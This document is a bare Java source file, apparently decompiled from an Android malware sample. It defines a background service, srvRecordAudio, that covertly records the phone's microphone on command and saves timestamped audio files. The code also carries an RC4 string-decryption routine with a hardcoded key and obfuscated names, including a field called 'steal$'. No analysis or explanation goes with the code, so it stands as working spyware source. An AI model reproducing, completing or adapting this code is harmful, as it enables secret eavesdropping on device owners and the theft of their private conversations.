package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Intent;
import android.media.MediaRecorder;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.service.srvRecordAudio$Runnable;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

public class srvRecordAudio extends IntentService {
   boolean version$ = false;
   utils brunei$ = new utils();
   constants exterior$ = new constants();
   String steal$;

   public srvRecordAudio() {
      super("");
   }

   public final String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onHandleIntent(Intent var1) {
      int var2 = Integer.parseInt(var1.getStringExtra("tick"));
      String var5 = var1.getStringExtra("name");
      if (var2 > 0 || var2 == -1) {
         String var3 = (new SimpleDateFormat("MM-dd-yyyy_HH:mm:ss", Locale.US)).format(Calendar.getInstance().getTime());
         StringBuilder var4 = new StringBuilder();
         var4.append("/");
         var4.append(var5);
         var4.append("_");
         var4.append(var3);
         var4.append(".amr");
         var5 = var4.toString();
         StringBuilder var8 = new StringBuilder();
         var8.append(this.getExternalFilesDir((String)null));
         var8.append(var5);
         this.steal$ = var8.toString();
         utils var6 = this.brunei$;
         var3 = "FILE REC";
         var4 = new StringBuilder();
         var4.append(this.steal$);
         var6.Log(var3, var4.toString());
         this.brunei$.Log("Time", String.valueOf(var2));
         var3 = this.steal$;
         MediaRecorder var7 = new MediaRecorder();
         this.brunei$.Log("SOUND", "START RECORD SOUND");
         this.version$ = false;
         var7.setAudioSource(1);
         var7.setOutputFormat(3);
         var7.setAudioEncoder(1);
         var7.setOutputFile(var3);
         Thread var9 = new Thread(new srvRecordAudio$Runnable(this, var2, var7, var3, this));
         var7.prepare();
         var7.start();
         var9.start();
         this.brunei$.SettingsWrite(this, "SS", "start");
      }

   }
}
